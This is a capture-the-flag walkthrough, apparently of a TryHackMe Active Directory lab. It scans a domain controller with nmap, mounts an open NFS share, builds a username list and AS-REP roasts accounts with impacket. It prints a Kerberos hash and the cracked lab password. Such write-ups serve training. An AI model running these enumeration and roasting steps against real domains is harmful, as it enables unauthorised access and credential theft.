![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1c614190-3275-4523-9a8e-6bde500b8806)

## first enumeration with nmap 

```shell
# Nmap 7.94SVN scan initiated Mon Apr  1 23:08:38 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 53,88,111,135,139,389,445,593,636,2049,3268,3269,3389,5985,9389 -Pn 10.10.35.124
Nmap scan report for 10.10.35.124
Host is up (0.13s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-01 22:10:10Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-04-01T22:11:05+00:00; +1m24s from scanner time.
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2024-03-31T22:05:52
|_Not valid after:  2024-09-30T22:05:52
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-01T22:10:57+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m24s, deviation: 0s, median: 1m23s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-01T22:10:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  1 23:10:57 2024 -- 1 IP address (1 host up) scanned in 139.69 seconds
```


## enumerating nfs

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
└─$ showmount -e 10.10.35.124    
Export list for 10.10.35.124:
/users (everyone)
                                                                                                                                                                                  
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
└─$ mkdir mount                                                                                 
                                                                                                                                                                                  
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
└─$ sudo mount -t nfs 10.10.35.124:/users ./mount -o nolock 
[sudo] password for n16hth4wk:

┌──(root㉿n16hth4wk-sec)-[/home/n16hth4wk/Documents/THM/Razorblack]
└─# cd mount    
                                                                                                                                                                                  
┌──(root㉿n16hth4wk-sec)-[/home/…/Documents/THM/Razorblack/mount]
└─# dir 
employee_status.xlsx  sbradley.txt
                                                                                                                                                                                  
┌──(root㉿n16hth4wk-sec)-[/home/…/Documents/THM/Razorblack/mount]
└─# ls     
employee_status.xlsx  sbradley.txt
```
first we check for nfs share available and next we mount the share. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3910a286-2cc6-4c2a-a651-4245ae591003)

checking the content of the xslx doc, we can see lists of users. 

```
daven port
imogen royce
tamara vidal
arthur edwards
carl ingram
nolan cassidy
reza zaydan
ljudmila vetrova
rico delgado
tyson williams
steven bradley
chamber lin
```
we got the users available. in the mounted file, we can see a username `sbradley`, let's use this format to generate lists of usernames. 

```
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin
```
made a list of usernames. let's try keberos tgt request on these usernames. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/THM/Razorblack]
└─$ impacket-GetNPUsers -dc-ip 10.10.35.124  -outputfile hashes.asreproast1 -usersfile user -request raz0rblack.thm/
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:b402a32bf45cbfb1e3f4aa8883a38c1e$20991bb387705e09fd43b4299000f464c863ad86f92e317596754993797d3a95aee1e1d5da35979673cc7b9a6cc3e620c51562a0db0ce475108a1130a3eee1ebcbddae63a033ff84e1f91681d998de75c1372b5b2c391dc7a09a50ae9ea98c24a3d96f4ba087e19ca42ad1ea7650b598c1b45e4ebd1fcf206fb98e83586af03e82c0411c293d8ffed8cce863e19027735dfc44bbdfbe5a9066f771c81ae1697a68804670a815d6510f4402d16cc155a0483b2d129397a3879f5d7a721fba65779f5a3cb78198dee282fd72bb4a7c6fc40f9e177d40c79d2ff3022f1753168a045f8a49206ef89fa7807be28ef85041b5
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
we got user `twilliams` hash. let's crack it

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/95846b57-f1ce-4db0-9af7-537c7d137b69)

cracked the hash. `twilliams:roastpotatoes`. 



